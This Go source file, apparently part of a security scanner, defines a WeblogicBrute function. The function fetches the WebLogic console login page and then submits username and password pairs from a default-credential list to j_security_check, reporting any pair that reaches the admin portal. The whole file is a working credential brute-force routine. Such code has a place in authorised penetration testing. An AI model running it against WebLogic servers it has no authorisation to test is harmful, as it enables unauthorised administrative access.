package brute

import (
	"fmt"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"strings"
)

func WeblogicBrute(url string, client *httpx.Client) (username string, password string) {
	client.Options.AllowRedirect = 5
	if req, err := client.Request(url+"/console/login/LoginForm.jsp", "GET", "", nil, "Brute"); err == nil {
		if req.StatusCode == 200 {
			for uspa := range weblogicuserpass {
				if req2, err2 := client.Request(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password), nil, "Brute"); err2 == nil {
					if strings.Contains(req2.RequestUrl, "console.portal") {
						logging.Logger.Infof(fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password, url+"/console/"))
						return weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password

					}
				}
			}
		}
	}
	return "", ""
}
